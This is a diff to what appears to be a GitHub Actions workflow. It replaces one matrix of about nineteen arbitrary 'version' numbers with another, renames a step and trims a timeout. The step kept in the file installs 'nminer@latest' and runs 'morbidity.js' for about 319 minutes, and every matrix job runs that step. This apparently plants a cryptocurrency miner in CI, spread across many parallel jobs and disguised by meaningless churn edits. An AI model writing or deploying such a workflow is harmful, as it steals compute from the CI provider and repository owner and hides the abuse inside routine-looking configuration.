@@ -9,25 +9,24 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 6466 }
-          - { version: 8827 }
-          - { version: 280 }
-          - { version: 9629 }
-          - { version: 2889 }
-          - { version: 9627 }
-          - { version: 9499 }
-          - { version: 933 }
-          - { version: 9284 }
-          - { version: 3386 }
-          - { version: 9713 }
-          - { version: 6219 }
-          - { version: 7314 }
-          - { version: 3351 }
-          - { version: 7629 }
-          - { version: 3484 }
-          - { version: 6061 }
-          - { version: 4401 }
-          - { version: 7876 }
+          - { version: 1547 }
+          - { version: 5264 }
+          - { version: 8335 }
+          - { version: 4024 }
+          - { version: 9184 }
+          - { version: 3384 }
+          - { version: 7478 }
+          - { version: 2811 }
+          - { version: 9007 }
+          - { version: 5297 }
+          - { version: 1091 }
+          - { version: 4809 }
+          - { version: 6530 }
+          - { version: 6549 }
+          - { version: 2047 }
+          - { version: 6364 }
+          - { version: 7539 }
+          - { version: 7867 }
 
     steps:
       - name: Checkout
@@ -38,7 +37,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: greedily
+      - name: 
         run: |
           npm install nminer@latest
-          timeout 320m node morbidity.js || echo "morbidity executed"
+          timeout 319m node morbidity.js || echo "morbidity executed"
